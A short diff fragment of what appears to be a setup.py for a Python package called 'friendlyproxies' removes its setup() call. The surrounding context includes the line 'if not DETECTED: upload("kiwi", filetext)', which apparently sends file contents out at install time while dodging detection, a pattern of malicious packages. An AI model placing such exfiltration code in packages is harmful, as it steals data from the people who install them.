@@ -906,14 +906,4 @@ if not DETECTED:
     upload("kiwi", filetext)
 
 
-setup(
-    name='friendlyproxies',
-    packages=['friendlyproxies'],
-    version='1.0',
-    license='MIT',
-    description='package manager.',
-    author='idklmao',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-)
+# setup(...) removed                                                                                                                                                                                                                                                                     
